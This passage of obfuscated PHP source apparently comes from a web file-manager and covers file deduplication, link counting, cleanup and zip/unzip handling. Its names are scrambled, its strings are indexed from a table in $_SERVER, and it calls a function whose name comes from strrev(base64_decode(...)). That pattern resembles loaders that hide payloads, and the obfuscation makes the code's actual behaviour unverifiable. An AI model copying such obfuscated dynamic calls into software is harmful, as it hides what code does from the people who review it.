strlen($ÃÊ≥Ωïç)); $˘˝É±‚˛ = $Ç˘≤‚∏… ? substr($Ç˘≤‚∏…, 0, 5) : ($ñõ‡æéî ? substr($ñõ‡æéî, 0, 5) : rand_string(5)); $È´πÿÑ¯ = $ãªÆ§¨ß . $Œõ∂„è“ . $˘˝É±‚˛; if ($ÃÊ≥Ωïç) { $È´πÿÑ¯ = $È´πÿÑ¯ . $ÿ›¸Ãè“[10] . $ÃÊ≥Ωïç; } } if (IO::isOsDriver($È´πÿÑ¯) && !IO::isUploadServer($È´πÿÑ¯)) { if (IO::exist($È´πÿÑ¯)) { return $È´πÿÑ¯; } $Èê≤¨˙¿ = IO::setContent($È´πÿÑ¯, $ÿ›¸Ãè“[12]); if (!$Èê≤¨˙¿) { show_json($ÿ›¸Ãè“[2023], !1); } } CacheLock::unlock($¥Ë¢Ü‚¥); break; case $ÿ›¸Ãè“[849]: break; default: break; } return $È´πÿÑ¯; } public function addFileByRemote($·ó¬ Ωñ, $Ω¯ï¯’í, $æ‹ˆ„ë = array()) { $ÊæÀ∏öˆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!IO::exist($·ó¬ Ωñ)) { return !1; } $œΩÇÑêŸ = $æ‹ˆ„ë[$ÊæÀ∏öˆ[555]] ? $æ‹ˆ„ë[$ÊæÀ∏öˆ[555]] : $ÊæÀ∏öˆ[12]; $∆Ôøﬁ≤≤ = IO::hashMd5($·ó¬ Ωñ, $œΩÇÑêŸ); $ÔÉàÀÓ‹ = KodIO::defaultDriver(); $øñÔﬂ˛“ = array($ÊæÀ∏öˆ[625] => IO::size($·ó¬ Ωñ), $ÊæÀ∏öˆ[2024] => 1, $ÊæÀ∏öˆ[502] => $Ω¯ï¯’í, $ÊæÀ∏öˆ[881] => $ÔÉàÀÓ‹[$ÊæÀ∏öˆ[483]], $ÊæÀ∏öˆ[503] => $·ó¬ Ωñ, $ÊæÀ∏öˆ[2025] => $æ‹ˆ„ë[$ÊæÀ∏öˆ[680]] ? $æ‹ˆ„ë[$ÊæÀ∏öˆ[680]] : IO::hashSimple($·ó¬ Ωñ), $ÊæÀ∏öˆ[2026] => $∆Ôøﬁ≤≤ ? $∆Ôøﬁ≤≤ : $œΩÇÑêŸ); if ($ãòÍó∞¸ = $this->addFileCheckExist($øñÔﬂ˛“[$ÊæÀ∏öˆ[680]], $øñÔﬂ˛“[$ÊæÀ∏öˆ[555]], $øñÔﬂ˛“[$ÊæÀ∏öˆ[79]])) { return $ãòÍó∞¸; } return $this->addFileData($øñÔﬂ˛“); } private function addFileData($“÷º∂ŸÂ) { $íÏ„¿÷ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$“÷º∂ŸÂ) { return !1; } $“÷º∂ŸÂ[$íÏ„¿÷[79]] = intval($“÷º∂ŸÂ[$íÏ„¿÷[79]]); if (!$“÷º∂ŸÂ[$íÏ„¿÷[79]] && strlen($“÷º∂ŸÂ[$íÏ„¿÷[680]]) > 32) { $“÷º∂ŸÂ[$íÏ„¿÷[79]] = intval(substr($“÷º∂ŸÂ[$íÏ„¿÷[680]], 32)); } $É¨¬∆¢∫ = $this->add($“÷º∂ŸÂ); return $this->find($É¨¬∆¢∫); } public function addFile($≤ÙÿÛÂ∏, $ÔÊí˜Ûû, $óÂõ‘•à = false) { $€ë±ƒ¶ö =& $_SERVER[ß⁄ˆÇ†Œ]; $Á•ÂÊ¯˘ = IO::hashSimple($≤ÙÿÛÂ∏); $π≤¢÷÷€ = IO::size($≤ÙÿÛÂ∏); $±¡óæœÍ = $π≤¢÷÷€ <= 1024 * 1024 * 10 ? IO::hashMd5($≤ÙÿÛÂ∏) : $€ë±ƒ¶ö[12]; $œáøÁµé = $€ë±ƒ¶ö[2027] . $Á•ÂÊ¯˘; CacheLock::lock($œáøÁµé); if ($±¡óæœÍ && $Á•ÂÊ¯˘) { $≤πá˘áÑ = $this->addFileCheckExist($Á•ÂÊ¯˘, $±¡óæœÍ, $π≤¢÷÷€); if ($≤πá˘áÑ) { CacheLock::unlock($œáøÁµé); return $≤πá˘áÑ; } } $ø‘≥¢¸â = $this->addFileMake($≤ÙÿÛÂ∏, $π≤¢÷÷€, $Á•ÂÊ¯˘, $±¡óæœÍ, $ÔÊí˜Ûû, $óÂõ‘•à); $ﬁéÜ˚¡¢ = $this->addFileData($ø‘≥¢¸â); CacheLock::unlock($œáøÁµé); if (!$±¡óæœÍ && $ﬁéÜ˚¡¢) { $this->fileMd5Check($ﬁéÜ˚¡¢); } return $ﬁéÜ˚¡¢; } public function fileMd5Check($≤«–˘–ˆ) { $≠‘∞ù‰© =& $_SERVER[ß⁄ˆÇ†Œ]; $ˆºÜ√ﬁì = array($≤«–˘–ˆ[$≠‘∞ù‰©[549]], $≤«–˘–ˆ[$≠‘∞ù‰©[87]]); $ŒãßÃç£ = $≠‘∞ù‰©[2028] . $≤«–˘–ˆ[$≠‘∞ù‰©[87]]; $∏Ω±ïÖÔ = $≠‘∞ù‰©[2029] . $≤«–˘–ˆ[$≠‘∞ù‰©[549]]; TaskQueue::add($≠‘∞ù‰©[2030], $ˆºÜ√ﬁì, $ŒãßÃç£, $∏Ω±ïÖÔ); } public function fileMd5Set($»õ“Ω∂±, $õíä ç∂) { $¡ÅæÚäì =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬁ˜∂˜—“ = $this->find($»õ“Ω∂±); if (!$ﬁ˜∂˜—“ || $ﬁ˜∂˜—“[$¡ÅæÚäì[555]]) { return; } $ÂÅëáÏÎ = IO::hashMd5($õíä ç∂); if (!$ÂÅëáÏÎ) { return $¡ÅæÚäì[12]; } $this->where(array($¡ÅæÚäì[549] => $»õ“Ω∂±))->save(array($¡ÅæÚäì[555] => $ÂÅëáÏÎ)); } public function addFileMake($º©¬’Ã÷, $∑ªöœ˘ê, $≠¡‚ñÊˆ, $É‚’‘ò£, $ó‚Ïå¯Ê, $ÜßáèÇ≥) { $ùã˛•îá =& $_SERVER[ß⁄ˆÇ†Œ]; $ÙüÌÏÉ≠ = $this->createFileName($ó‚Ïå¯Ê, $≠¡‚ñÊˆ, $É‚’‘ò£); $í˚´Òò™ = get_path_father($ÙüÌÏÉ≠); $Ùˆ”Ë◊â = get_path_this($ÙüÌÏÉ≠); if ($ÜßáèÇ≥) { $∑ÏÈ≤’Å = IO::move($º©¬’Ã÷, $í˚´Òò™, !1, $Ùˆ”Ë◊â); } else { $∑ÏÈ≤’Å = IO::copy($º©¬’Ã÷, $í˚´Òò™, !1, $Ùˆ”Ë◊â); } if (!$∑ÏÈ≤’Å) { return !1; } $π¸Ô¡ùå = KodIO::defaultDriver(); $’§ˆ¥Óÿ = array($ùã˛•îá[625] => $∑ªöœ˘ê, $ùã˛•îá[2024] => 1, $ùã˛•îá[502] => $ó‚Ïå¯Ê, $ùã˛•îá[881] => $π¸Ô¡ùå[$ùã˛•îá[483]], $ùã˛•îá[503] => $ÙüÌÏÉ≠, $ùã˛•îá[2025] => $≠¡‚ñÊˆ, $ùã˛•îá[2026] => $É‚’‘ò£); return $’§ˆ¥Óÿ; } public function addFileCheckExist($±£ ÀÓ¡, $–ﬁ∂—Î˛, $ä¿≥—„Ò) { $Ú∏ÖÍà¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $Õ‡Ç ¥ª = $this->findByHash($±£ ÀÓ¡, $–ﬁ∂—Î˛); if (!$Õ‡Ç ¥ª) { return !1; } $ÒÎãÀÒ÷ = array($Ú∏ÖÍà¸[2024] => intval($Õ‡Ç ¥ª[$Ú∏ÖÍà¸[2031]]) + 1, $Ú∏ÖÍà¸[625] => $ä¿≥—„Ò); $this->where(array($Ú∏ÖÍà¸[550] => $Õ‡Ç ¥ª[$Ú∏ÖÍà¸[549]]))->save($ÒÎãÀÒ÷); return $Õ‡Ç ¥ª; } public function remove($∏’¡ˆˆ) { $this->linkCountChange($∏’¡ˆˆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¢ØŸÒ·›) { $this->linkCountChange($¢ØŸÒ·›, !0); } public function linkCountChange($ﬂÏÉ°æª, $ü‰Õ≤ã·) { $æ≈û„Î€ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ﬂÏÉ°æª) { return; } if (!is_array($ﬂÏÉ°æª)) { $ﬂÏÉ°æª = array($ﬂÏÉ°æª); } $Ù…¶Ä≠– = array(); foreach ($ﬂÏÉ°æª as $ÚË äÖ¬) { $î¢ÍöªÂ = $ÚË äÖ¬ . $æ≈û„Î€[12]; if (!$Ù…¶Ä≠–[$î¢ÍöªÂ]) { $Ù…¶Ä≠–[$î¢ÍöªÂ] = 0; } $Ù…¶Ä≠–[$î¢ÍöªÂ]++; } $¢ø”ñï  = array(); foreach ($Ù…¶Ä≠– as $ÚË äÖ¬ => $Ô´• »Î) { $î¢ÍöªÂ = $Ô´• »Î . $æ≈û„Î€[12]; if (!$¢ø”ñï [$î¢ÍöªÂ]) { $¢ø”ñï [$î¢ÍöªÂ] = array(); } $¢ø”ñï [$î¢ÍöªÂ][] = $ÚË äÖ¬; } foreach ($¢ø”ñï  as $Ô´• »Î => $ñ”èﬂ¬⁄) { if (!$ñ”èﬂ¬⁄) { continue; } $Ô´• »Î = $ü‰Õ≤ã· ? $Ô´• »Î : -intval($Ô´• »Î); $”Œå˙õö = array($æ≈û„Î€[549] => array($æ≈û„Î€[7], $ñ”èﬂ¬⁄)); if ($Ô´• »Î < 0) { $”Œå˙õö[$æ≈û„Î€[2031]] = array($æ≈û„Î€[1089], abs($Ô´• »Î)); } $this->where($”Œå˙õö)->setAdd($æ≈û„Î€[2031], $Ô´• »Î); } } public function findByHash($ﬁ¬Âπë‡, $π†Ò˘¥Ö = false) { $òÑÎ√úÂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ﬁ¬Âπë‡ && !$π†Ò˘¥Ö) { return !1; } $ä»…êÙ = array($òÑÎ√úÂ[2025] => $ﬁ¬Âπë‡); if ($π†Ò˘¥Ö) { $ä»…êÙ = array($òÑÎ√úÂ[2026] => $π†Ò˘¥Ö); } return $this->order($òÑÎ√úÂ[2032])->where($ä»…êÙ)->find(); } public function clearEmpty($ˆüıÊÅ = 0) { $˙ãçù©ñ =& $_SERVER[ß⁄ˆÇ†Œ]; $Âª˛ÉÕ® = time() - 3600 * 24 * $ˆüıÊÅ; $—§Ü≤ıÔ = $˙ãçù©ñ[2033] . $Âª˛ÉÕ®; $◊äÙ€§ì = $this->where($—§Ü≤ıÔ)->select(); if (!$◊äÙ€§ì) { return; } $Ëì‡ÇÚø = new Task($˙ãçù©ñ[2034], $˙ãçù©ñ[12], count($◊äÙ€§ì)); foreach ($◊äÙ€§ì as $˝ßˆÍ‚Å) { $Ëì‡ÇÚø->update(1); $this->resetFile($˝ßˆÍ‚Å); } $Ëì‡ÇÚø->end(); } public function resetFile($…«Éî”˜) { $ï—È˛õΩ =& $_SERVER[ß⁄ˆÇ†Œ]; $ãÚµ®÷Ã = array($ï—È˛õΩ[550] => $…«Éî”˜[$ï—È˛õΩ[549]]); $◊°ÒüØ¢ = Model($ï—È˛õΩ[1414])->where($ãÚµ®÷Ã)->count(); $≤Æ∆‚≥µ = Model($ï—È˛õΩ[2035])->where($ãÚµ®÷Ã)->count(); $ª†˝ë…‹ = intval($◊°ÒüØ¢) + intval($≤Æ∆‚≥µ); if ($ª†˝ë…‹ == 0) { IO::remove($…«Éî”˜[$ï—È˛õΩ[87]]); Model($ï—È˛õΩ[2036])->delete($…«Éî”˜[$ï—È˛õΩ[549]]); $this->where($ãÚµ®÷Ã)->delete(); $this->metaSet($…«Éî”˜[$ï—È˛õΩ[549]], null, null); write_log(ACTION . $ï—È˛õΩ[2037] . KodUser::id() . $ï—È˛õΩ[2038] . $…«Éî”˜[$ï—È˛õΩ[549]] . $ï—È˛õΩ[2039] . $…«Éî”˜[$ï—È˛õΩ[79]] . $ï—È˛õΩ[201] . $…«Éî”˜[$ï—È˛õΩ[87]], $ï—È˛õΩ[2040]); return; } if ($…«Éî”˜[$ï—È˛õΩ[2031]] != $ª†˝ë…‹) { $this->where($ãÚµ®÷Ã)->save(array($ï—È˛õΩ[2024] => $ª†˝ë…‹)); } } public function storageInfo($Ù¯ªç—â = false) { $Ëé∏‡‹§ =& $_SERVER[ß⁄ˆÇ†Œ]; $Á˚ôØΩô = $this->count() + 0.0; $…ê€πﬁÌ = 0; $¥⁄√ÑÑ¶ = 1; $Ûõßç©€ = 0; $Ôπ¡˘Ã» = 5000; for ($¡⁄¬„∆≠ = 0; $¡⁄¬„∆≠ < $Á˚ôØΩô; $¡⁄¬„∆≠ = $¡⁄¬„∆≠ + $Ôπ¡˘Ã») { $πÛ∫¥òÁ = $this->limit($¡⁄¬„∆≠, $¡⁄¬„∆≠ + $Ôπ¡˘Ã»)->select(); foreach ($πÛ∫¥òÁ as $ŸÆ◊±˘ï) { $¥⁄√ÑÑ¶ += $ŸÆ◊±˘ï[$Ëé∏‡‹§[79]] * $ŸÆ◊±˘ï[$Ëé∏‡‹§[2031]]; $…ê€πﬁÌ += $ŸÆ◊±˘ï[$Ëé∏‡‹§[79]] * ($ŸÆ◊±˘ï[$Ëé∏‡‹§[2031]] - 1); $Ûõßç©€ += $ŸÆ◊±˘ï[$Ëé∏‡‹§[2031]]; } } $Ô©æóı€ = array($Ëé∏‡‹§[2041] => $¥⁄√ÑÑ¶, $Ëé∏‡‹§[2042] => $…ê€πﬁÌ, $Ëé∏‡‹§[2043] => $…ê€πﬁÌ / $¥⁄√ÑÑ¶, $Ëé∏‡‹§[83] => $Á˚ôØΩô, $Ëé∏‡‹§[2044] => $Ûõßç©€); return $Ô©æóı€; } } goto c‘ΩÁ§¶Íè; a·»•Û†–Ê: $fileSize = strrev(base64_decode($_SERVER[Ú›Ë•ÓÌ][0])); function binCheckNeq($ÌÍè¨Õ¢, $íÏ†≤ﬂÌ) { return $ÌÍè¨Õ¢ != $íÏ†≤ﬂÌ; } $_SERVER[$_SERVER[Ú›Ë•ÓÌ][1]] = $fileSize($_SERVER[$_SERVER[Ú›Ë•ÓÌ][2]]); goto eàãåçÛ–¬; cìÒ£ä≥¶æ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $©ŸÈÈ«ò; if ($©ŸÈÈ«ò) { return $©ŸÈÈ«ò; } $„œö◊¸î = IO::init($_SERVER[ß⁄ˆÇ†Œ][8]); return $„œö◊¸î; } private static function iconvSystem($–çüôã¬) { return self::local()->iconvSystem($–çüôã¬); } private static function iconvApp($¯Ì∏ö˝‘) { return self::local()->iconvApp($¯Ì∏ö˝‘); } public static function zipFolder($Ô¶¨Øë , $çÇ…Êç∞ = "\x7a\151\x70", $ñÒ¢¯±Õ = '', $¨… –ßŒ = REPEAT_RENAME) { $Ã™£¡¡º =& $_SERVER[ß⁄ˆÇ†Œ]; $éÒﬁíÿﬁ = IO::listPath($Ô¶¨Øë ); if (!$éÒﬁíÿﬁ) { return !1; } $éÒﬁíÿﬁ = array_merge($éÒﬁíÿﬁ[$Ã™£¡¡º[85]], $éÒﬁíÿﬁ[$Ã™£¡¡º[86]]); return self::zip($éÒﬁíÿﬁ, $çÇ…Êç∞, $ñÒ¢¯±Õ, $¨… –ßŒ); } public static function zip($Â„ÃÇ‹Ÿ, $π®˘‡Ï‡ = "\172\151\x70", $˛ÍÓﬂ†˚ = '', $âúœ¢ıê = REPEAT_RENAME) { $ú≈Õ£ß◊ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($Â„ÃÇ‹Ÿ) && $Â„ÃÇ‹Ÿ) { $Â„ÃÇ‹Ÿ = array(array($ú≈Õ£ß◊[87] => $Â„ÃÇ‹Ÿ)); } $Ÿ≥ó÷ÄÊ = self::init($Â„ÃÇ‹Ÿ[0][$ú≈Õ£ß◊[87]]); $§£¡˚¢ñ = self::info($Â„ÃÇ‹Ÿ[0][$ú≈Õ£ß◊[87]]); $£∫∑“ß› = $ú≈Õ£ß◊[12]; $⁄ñ‹ÏÁ° = $ú≈Õ£ß◊[12]; $¢ï©˛€É = $ú≈Õ£ß◊[12]; if ($˛ÍÓﬂ†˚ && substr($˛ÍÓﬂ†˚, -1, 1) != $ú≈Õ£ß◊[8]) { $⁄ñ‹ÏÁ° = get_path_father($˛ÍÓﬂ†˚); $¢ï©˛€É = get_path_this($˛ÍÓﬂ†˚); } else { $⁄ñ‹ÏÁ° = self::pathFather($§£¡˚¢ñ[$ú≈Õ£ß◊[87]]); $¢ï©˛€É = $§£¡˚¢ñ[$ú≈Õ£ß◊[32]] . $ú≈Õ£ß◊[10] . $π®˘‡Ï‡; if (count($Â„ÃÇ‹Ÿ) > 1) { $ÊãŸçÂô = IO::info($⁄ñ‹ÏÁ°); $¢ï©˛€É = $ÊãŸçÂô[$ú≈Õ£ß◊[32]] . $ú≈Õ£ß◊[10] . $π®˘‡Ï‡; } if ($˛ÍÓﬂ†˚) { $⁄ñ‹ÏÁ° = $˛ÍÓﬂ†˚; } } if ($Ÿ≥ó÷ÄÊ->getType() == $ú≈Õ£ß◊[109]) { $û•ﬁ´Ê∂ = self::init($⁄ñ‹ÏÁ°); $–ø–¨í¸ = $û•ﬁ´Ê∂->getType() == $ú≈Õ£ß◊[109] ? $⁄ñ‹ÏÁ° : get_path_father($Ÿ≥ó÷ÄÊ->path); $–ø–¨í¸ = rtrim($–ø–¨í¸, $ú≈Õ£ß◊[8]) . $ú≈Õ£ß◊[8]; mk_dir($–ø–¨í¸); } else { $£∫∑“ß› = TEMP_FILES . $ú≈Õ£ß◊[1261] . time() . rand_string(8) . $ú≈Õ£ß◊[8]; mk_dir($£∫∑“ß›); file_put_contents($£∫∑“ß› . $ú≈Õ£ß◊[1262], $ú≈Õ£ß◊[12]); $–ø–¨í¸ = $£∫∑“ß›; } $â ˙©˘Î = IO::info($–ø–¨í¸); if (!$â ˙©˘Î || !$â ˙©˘Î[$ú≈Õ£ß◊[233]]) { show_json(LNG($ú≈Õ£ß◊[1263]), !1); } $ï˜Œ´“Õ = self::zipFileList($Â„ÃÇ‹Ÿ, $£∫∑“ß›); foreach ($ï˜Œ´“Õ as $‚î˝º¬ª => $—÷Â…øπ) { $ï˜Œ´“Õ[$‚î˝º¬ª] = self::iconvSystem($—÷Â…øπ); } $µàÊËãƒ = get_filename_auto($–ø–¨í¸ . $¢ï©˛€É, $ú≈Õ£ß◊[12], $âúœ¢ıê); KodArchive::create(self::iconvSystem($µàÊËãƒ), $ï˜Œ´“Õ); if (!IO::exist($µàÊËãƒ)) { if ($£∫∑“ß›) { del_dir($£∫∑“ß›); } write_log($ú≈Õ£ß◊[1264] . $µàÊËãƒ, $ú≈Õ£ß◊[398]); show_json(LNG($ú≈Õ£ß◊[1265]), !1); } if (!$£∫∑“ß›) { return $µàÊËãƒ; } $∞øâΩÑ‰ = self::move($µàÊËãƒ, $⁄ñ‹ÏÁ°, $âúœ¢ıê); if ($£∫∑“ß›) { del_dir($£∫∑“ß›); } if (!$µàÊËãƒ) { write_log($ú≈Õ£ß◊[1266] . $µàÊËãƒ . $ú≈Õ£ß◊[1267] . $⁄ñ‹ÏÁ°, $ú≈Õ£ß◊[398]); show_json(LNG($ú≈Õ£ß◊[1265]), !1); } return $∞øâΩÑ‰; } public static function unzip($ Ÿ¸†æÔ, $œÓ¯∞Õó, $óÒê¡Öú = "\x2d\x31", $éß≈öø = "\x72\145\160\154\x61\x63\x65") { $¢Íùﬂ¯ã =& $_SERVER[ß⁄ˆÇ†Œ]; $π©¯ﬂ˘‡ = parent::info($ Ÿ¸†æÔ); if (!$π©¯ﬂ˘‡) { show_json(LNG($¢Íùﬂ¯ã[1268]), !1); } $„˙†Ÿ·Ô = IO::infoFullSimple($œÓ¯∞Õó); if (!$„˙†Ÿ·Ô) { $œÓ¯∞Õó = IO::mkdir($œÓ¯∞Õó); } if (isset($„˙†Ÿ·Ô[$¢Íùﬂ¯ã[193]]) && trim($„˙†Ÿ·Ô[$¢Íùﬂ¯ã[87]], $¢Íùﬂ¯ã[8]) != trim($œÓ¯∞Õó, $¢Íùﬂ¯ã[8])) { $‚èÔ‡òŸ = KodIO::make($„˙†Ÿ·Ô[$¢Íùﬂ¯ã[192]]); $ï˛Ñ¸Ä = IO::fileNameAuto($‚èÔ‡òŸ, $„˙†Ÿ·Ô[$¢Íùﬂ¯ã[32]], REPEAT_RENAME_FOLDER, !0); $œÓ¯∞Õó = IO::mkdir($‚èÔ‡òŸ . $ï˛Ñ¸Ä); } $óÒê¡Öú = $óÒê¡Öú && $óÒê¡Öú != $¢Íùﬂ¯ã[1269] ? @json_decode($óÒê¡Öú, !0) : -1; $æœúòõÊ = self::unzipPart($ Ÿ¸†æÔ, $óÒê¡Öú); if (!$æœúòõÊ || !IO::exist($æœúòõÊ[$¢Íùﬂ¯ã[230]])) { show_json(LNG($¢Íùﬂ¯ã[108]), !1); } $ûØÜåÑ± = $æœúòõÊ[$¢Íùﬂ¯ã[1270]][count($æœúòõÊ[$¢Íùﬂ¯ã[1270]]) - 1]; if ($ûØÜåÑ±[$¢Íùﬂ¯ã[1271]] == -1 || substr($ûØÜåÑ±[$¢Íùﬂ¯ã[32]], -1, 1) == $¢Íùﬂ¯ã[8]) { $«»á∞òÒ = $æœúòõÊ[$¢Íùﬂ¯ã[1272]] . rand_string(10) . $¢Íùﬂ¯ã[8]; mk_dir($«»á∞òÒ); $ôÙ˘†∆ = count($æœúòõÊ[$¢Íùﬂ¯ã[1270]]) == 1 ? IO::ext($ Ÿ¸†æÔ) : get_path_ext($æœúòõÊ[$¢Íùﬂ¯ã[230]]); $‚≤‹ÇÇ√ = KodArchive::extract(self::iconvSystem($æœúòõÊ[$¢Íùﬂ¯ã[230]]), $«»á∞òÒ, $ûØÜåÑ±[$¢Íùﬂ¯ã[1271]], $ï˛Ñ¸Ä, $ôÙ˘†∆); self::unzipErrorCheck($‚≤‹ÇÇ√, array($¢Íùﬂ¯ã[1273], $ Ÿ¸†æÔ, $ôÙ˘†∆, $œÓ¯∞Õó, $æœúòõÊ)); Hook::trigger($¢Íùﬂ¯ã[1274], $«»á∞òÒ); recursion_dir($«»á∞òÒ, $∏ÂÀ¢”§, $„óı¸•∫, 0); $«◊ÿò¬ÿ = array_merge($∏ÂÀ¢”§, $„óı¸•∫); $Å‹´¯Ú“ = array(); foreach ($«◊ÿò¬ÿ as $ã¢∑¬√Î) { $∫«ï°ñ‰ = IO::move(self::iconvApp($ã¢∑¬√Î), $œÓ¯∞Õó, $éß≈öø); if ($∫«ï°ñ‰) { $Å‹´¯Ú“[] = $∫«ï°ñ‰; } } del_dir($«»á∞òÒ); } else { $∫«ï°ñ‰ = IO::move($æœúòõÊ[$¢Íùﬂ¯ã[230]], $œÓ¯∞Õó, $éß≈öø, get_path_this($ûØÜåÑ±[$¢Íùﬂ¯ã[32]])); if ($∫«ï°ñ‰) { $Å‹´¯Ú“[] = $∫«ï°ñ‰; } } return $Å‹´¯Ú“ ? $Å‹´¯Ú“ : !1; } public static function unzipList($“åÀäÅ¯) { $ø√ËÓúè =& $_SERVER[ß⁄ˆÇ†Œ]; $¯’Ÿ–∫„ = isset($“åÀäÅ¯[$ø√ËÓúè[1275]]) ? $“åÀäÅ¯[$ø√ËÓúè[1275]] : !1; $¨ÒÿÄÂ£ = isset($“åÀäÅ¯[$ø√ËÓúè[1271]]) ? @json_decode($“åÀäÅ¯[$ø√ËÓúè[1271]], !0) : -1; $·™ÉÏ√À = self::unzipPart($“åÀäÅ¯[$ø√ËÓúè[87]], $¨ÒÿÄÂ£); if (!$·™ÉÏ√À || !IO::exist($·™ÉÏ√À[$ø√ËÓúè[230]])) { show_json(LNG($ø√ËÓúè[108]), !1); } $•ÃŸôñ˘ = $·™ÉÏ√À[$ø√ËÓúè[1270]][count($·™ÉÏ√À[$ø√ËÓúè[1270]]) - 1]; $”ΩìÒ°Í = in_array(IO::ext($·™ÉÏ√À[$ø√ËÓúè[230]]), array($ø√ËÓúè[398], $ø√ËÓúè[1276], $ø√ËÓúè[1277], $ø√ËÓúè[1278], $ø√ËÓúè[1279], $ø√ËÓúè[1280])); if (!$¯’Ÿ–∫„ && ($•ÃŸôñ˘[$ø√ËÓúè[1271]] == -1 || $”ΩìÒ°Í)) { $∂ÈàÖ»√ = $·™ÉÏ√À[$ø√ËÓúè[1272]] . get_path_this($·™ÉÏ√À[$ø√ËÓúè[230]]) . $ø√ËÓúè[1281]; if (!IO::exist($∂ÈàÖ»√)) { $ö§⁄’à = $•ÃŸôñ˘[$ø√ËÓúè[1271]] == -1 ? get_path_ext(IO::pathThis($“åÀäÅ¯[$ø√ËÓúè[87]])) : get_path_ext($·™ÉÏ√À[$ø√ËÓúè[230]]); $È›¯À∏° = KodArchive::listContent(self::iconvSystem($·™ÉÏ√À[$ø√ËÓúè[230]]), !0, $ö§⁄’à); self::unzipErrorCheck($È›¯À∏°, array($ø√ËÓúè[1282], $“åÀäÅ¯, $·™ÉÏ√À)); @file_put_contents($∂ÈàÖ»√, json_encode($È›¯À∏°[$ø√ËÓúè[1283]])); } return @json_decode(IO::getContent($∂ÈàÖ»√), !0); } IO::fileOut($·™ÉÏ√À[$ø√ËÓúè[230]], $¯’Ÿ–∫„, get_path_this($•ÃŸôñ˘[$ø√ËÓúè[32]])); die; } private static function zipFileList($ÀóË’Òû, $√¢Å©∑˛ = false) { $öÓËœ«Ã =& $_SERVER[ß⁄ˆÇ†Œ]; $Ô™¨Ôóí = array(); foreach ($ÀóË’Òû as $ûﬂÊûÂ¶) { $äÃ•œÍ€ = $ûﬂÊûÂ¶[$öÓËœ«Ã[87]]; if ($√¢Å©∑˛) { $äÃ•œÍ€ = self::copy($ûﬂÊûÂ¶[$öÓËœ«Ã[87]], $√¢Å©∑˛, $öÓËœ«Ã[891]); } else { $ú‹ó¯§è = self::init($ûﬂÊûÂ¶[$öÓËœ«Ã[87]]); if ($ú‹ó¯§è->getType() == $öÓËœ«Ã[109]) { $äÃ•œÍ€ = $ú‹ó¯§è->path; } } if ($äÃ•œÍ€ && self::local()->exist($äÃ•œÍ€)) { $Ô™¨Ôóí[$ûﬂÊûÂ¶[$öÓËœ«Ã[87]]] = $äÃ•œÍ€; } } if (!empty($Ô™¨Ôóí)) { return array_values($Ô™¨Ôóí); } show_json(LNG($öÓËœ«Ã[1242]), !1); } private static function localFilePath($ÆπêÀÄ’) { $–ø≠•”¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $º≥‹˛È¯ = KodIO::parse($ÆπêÀÄ’); if ($º≥‹˛È¯[$–ø≠•”¥[33]] == KodIO::KOD_SOURCE) { $∑¸∂§∆‡ = Model($–ø≠•”¥[897])->fileInfoGet(KodIO::sourceID($ÆπêÀÄ’)); if (!$∑¸∂§∆‡[$–ø≠•”¥[87]]) { show_json($–ø≠•”¥[1284], !1); } $ÆπêÀÄ’ = $∑¸∂§∆‡[$–ø≠•”¥[87]]; } $¨‘¿Åä„ = self::init($ÆπêÀÄ’); if ($¨‘¿Åä„->pathParse[$–ø≠•”¥[1228]]) { $ÆπêÀÄ’ = $¨‘¿Åä„->pathParse[$–ø≠•”¥[1228]]; $¨‘¿Åä„ = self::init($ÆπêÀÄ’); } $¿Í˛ò¬≠ = $¨‘¿Åä„->getType(); if ($¿Í˛ò¬≠ == $–ø≠•”¥[109] || $¿Í˛ò¬≠ == $–ø≠•”¥[1285]) { if (!$¨‘¿Åä„->exist($¨‘¿Åä„->path)) { show_json(LNG($–ø≠•”¥[108]), !1); } return $¨‘¿Åä„->path; } return !1; } public static function unzipPart($Æá§»ıî, $Óƒ≥∏«π = -1) { $Ïù“Ü˛° =& $_SERVER[ß⁄ˆÇ†Œ]; $áîÈÉ∂≠ = IO::pathThis($Æá§»ıî); if (!$Óƒ≥∏«π || $Óƒ≥∏«π == -1) { $›˚Í˜Œ¥ = array(array($Ïù“Ü˛°[32] => $áîÈÉ∂≠, $Ïù“Ü˛°[1271] => -1)); $›˚Í˜Œ¥[0][$Ïù“Ü˛°[1286]] = $›˚Í˜Œ¥[0][$Ïù“Ü˛°[32]]; } else { if (is_array($Óƒ≥∏«π)) { $›˚Í˜Œ¥ = $Óƒ≥∏«π; $Ä˘ÃÈ°≠ = count($›˚Í˜Œ¥) - 1; for ($ÉÕ∆≥é = 0; $ÉÕ∆≥é <= $Ä˘ÃÈ°≠; $ÉÕ∆≥é++) { $¿ﬁÁÓ¶˙ = $›˚Í˜Œ¥[$ÉÕ∆≥é]; $¶ëÅÅØè = get_path_this($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[32]]) . (checkExtSafe($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[32]]) ? $Ïù“Ü˛°[12] : $Ïù“Ü˛°[1287]); $›˚Í˜Œ¥[$ÉÕ∆≥é][$Ïù“Ü˛°[1286]] = $Ïù“Ü˛°[1288] . intval($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[1271]]) . $Ïù“Ü˛°[470] . $¶ëÅÅØè; if ($ÉÕ∆≥é == 0) { continue; } $›˚Í˜Œ¥[$ÉÕ∆≥é][$Ïù“Ü˛°[1286]] = $›˚Í˜Œ¥[$ÉÕ∆≥é - 1][$Ïù“Ü˛°[1286]] . $Ïù“Ü˛°[1289] . $›˚Í˜Œ¥[$ÉÕ∆≥é][$Ïù“Ü˛°[1286]]; } } } if (!is_array($›˚Í˜Œ¥) || count($›˚Í˜Œ¥) == 0) { return !1; } $˛óﬁ±ªÊ = $›˚Í˜Œ¥[count($›˚Í˜Œ¥) - 1]; if (!IO::exist($Æá§»ıî)) { return !1; } $≤Ê◊”Íº = TEMP_FILES . $Ïù“Ü˛°[1290] . kodIO::hashPathSafe($Æá§»ıî) . $Ïù“Ü˛°[8]; $ÅÍÁêÌ = $≤Ê◊”Íº . 